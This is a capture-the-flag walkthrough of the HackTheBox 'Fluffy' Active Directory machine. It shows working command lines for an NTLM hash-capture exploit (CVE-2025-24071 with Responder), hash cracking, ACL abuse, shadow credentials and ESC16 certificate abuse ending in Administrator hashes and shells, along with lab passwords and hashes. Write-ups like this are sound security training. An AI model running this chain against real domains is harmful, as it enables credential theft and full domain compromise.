# HackTheBox — Fluffy

**Difficulty:** Easy  
**OS:** Windows  
**Tags:** Active Directory, ADCS, ESC16, CVE-2025-24071, Shadow Credentials, ACL Abuse

---

## Summary

Fluffy is an assumed-breach AD box. Initial creds are provided for a low-privileged user. The attack chain involves:

1. Exploiting **CVE-2025-24071** (malicious `.library-ms` in ZIP) to steal NTLMv2 hash via a writable SMB share
2. Cracking the hash to get `p.agila` credentials
3. Abusing **GenericAll → GenericWrite ACL chain** via bloodyAD + certipy shadow credentials
4. Getting WinRM shell as `winrm_svc` (user flag)
5. **ESC16** privilege escalation via `ca_svc` UPN manipulation → Administrator hash

---

## Setup

```bash
echo "10.10.11.69 fluffy.htb dc01.fluffy.htb" | sudo tee -a /etc/hosts
sudo ntpdate dc01.fluffy.htb   # clock sync required for Kerberos
```

**Provided credentials:** `j.fleischman:J0elTHEM4n1990!`

---

## Enumeration

### Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 10.10.11.69
```

Key ports: `53, 88, 139, 389, 445, 464, 636, 3268, 3269, 5985, 9389`

Domain: `fluffy.htb` | DC: `DC01.fluffy.htb`

### SMB

```bash
netexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```

Found **IT** share with READ+WRITE. Contains:
- `Upgrade_Notice.pdf` — lists CVEs to be patched, including **CVE-2025-24071**
- `KeePass-2.58.zip`
- `Everything-1.4.1.1026.x64.zip`

### User Enumeration (RID Brute)

```bash
netexec smb 10.10.11.69 -u 'guest' -p '' --rid-brute
```

Users found:
| User | RID | Notes |
|------|-----|-------|
| `ca_svc` | 1103 | Certificate Authority service account |
| `ldap_svc` | 1104 | LDAP service account |
| `p.agila` | 1601 | Target for NTLM capture |
| `winrm_svc` | 1603 | Member of Remote Management Users |
| `j.coffey` | 1605 | |
| `j.fleischman` | 1606 | Provided user |

---

## Foothold — CVE-2025-24071

**Windows File Explorer Spoofing** — triggers NTLM auth when a ZIP containing a crafted `.library-ms` is extracted.

### Generate malicious ZIP

```bash
git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git
cd CVE-2025-24071_PoC
python3 poc.py
# Enter filename: anything
# Enter IP: <your tun0 IP>
```

### Upload to IT share

```bash
smbclient //10.10.11.69/IT -U 'j.fleischman%J0elTHEM4n1990!'
smb: \> put exploit.zip
```

### Start Responder

```bash
sudo responder -I tun0
```

After a few seconds, capture:

```
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:<hash>
```

### Crack the hash

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `p.agila:prometheusx-303`

---

## Lateral Movement — ACL Abuse

### Bloodhound enumeration

```bash
bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' \
  -dc dc01.fluffy.htb -c all -ns 10.10.11.69
```

**ACL chain discovered:**

```
p.agila
  └─[Member of]─► Service Account Managers
                     └─[GenericAll]─► Service Accounts
                                        └─[GenericWrite]─► ca_svc, winrm_svc, ldap_svc
```

`winrm_svc` is also a member of **Remote Management Users**.

### Add p.agila to Service Accounts group

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb \
  --host 10.10.11.69 add groupMember 'service accounts' p.agila
```

### Shadow Credentials attack → get NT hashes

```bash
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
# NT hash for ca_svc: ca0f4f9e9eb8a092addf53bb03fc98c8

certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
# NT hash for winrm_svc: 33bd09dcd697600edf6b3a7af4875767
```

### WinRM shell → user flag

```bash
evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb
```

```
C:\Users\winrm_svc\Desktop\user.txt
```

---

## Privilege Escalation — ESC16

### Confirm ADCS

```bash
netexec ldap 10.10.11.69 -u 'winrm_svc' \
  -H 33bd09dcd697600edf6b3a7af4875767 -M adcs
# Found CN: fluffy-DC01-CA
```

### Find vulnerable templates

```bash
certipy-ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -dc-ip 10.10.11.69 -vulnerable -enabled -stdout
```

**Vulnerability:** `ESC16 — Security Extension (szOID_NTDS_CA_SECURITY_EXT) is disabled`

### Exploit ESC16

**Step 1 — Update ca_svc UPN to Administrator**

```bash
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" \
  -user ca_svc -upn 'administrator'
```

**Step 2 — Request certificate as ca_svc (gets Administrator UPN)**

```bash
certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -dc-ip 10.10.11.69 -target dc01.fluffy.htb \
  -ca 'fluffy-DC01-CA' -template 'User'
# Saved to administrator.pfx
```

**Step 3 — Restore ca_svc UPN**

```bash
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" \
  -user ca_svc -upn 'ca_svc@fluffy.htb'
```

**Step 4 — Authenticate with certificate → get Administrator hash**

```bash
certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.10.11.69
# NT hash: 8da83a3fa618b6e3a00e93f676c92a6e
```

**Step 5 — Shell as Administrator**

```bash
evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb
```

```
C:\Users\Administrator\Desktop\root.txt
```

---

## Attack Chain Summary

```
j.fleischman (given)
  │
  ├─[SMB IT share write]──► CVE-2025-24071
  │                            └─► p.agila NTLMv2 hash → crack → prometheusx-303
  │
  └─[p.agila]
       ├─[GenericAll via Service Account Managers]──► add self to Service Accounts
       ├─[GenericWrite]──► Shadow Creds on winrm_svc → hash → WinRM shell (user.txt)
       └─[GenericWrite]──► Shadow Creds on ca_svc → hash
                              └─[ESC16]──► UPN swap → cert as Administrator → root.txt
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port/service enumeration |
| `netexec` | SMB/LDAP enumeration, RID brute |
| `smbclient` | SMB share access |
| `responder` | NTLM hash capture |
| `hashcat` | Hash cracking |
| `bloodhound-python` | AD enumeration |
| `bloodyAD` | Group membership modification |
| `certipy-ad` | Shadow credentials + ESC16 exploit |
| `evil-winrm` | WinRM shell |

---

## References

- [CVE-2025-24071 PoC](https://github.com/0x6rss/CVE-2025-24071_PoC)
- [ESC16 — Certipy Wiki](https://github.com/ly4k/Certipy/wiki)
- [HTB Official Writeup — kavigihan](https://app.hackthebox.com/machines/Fluffy)
  
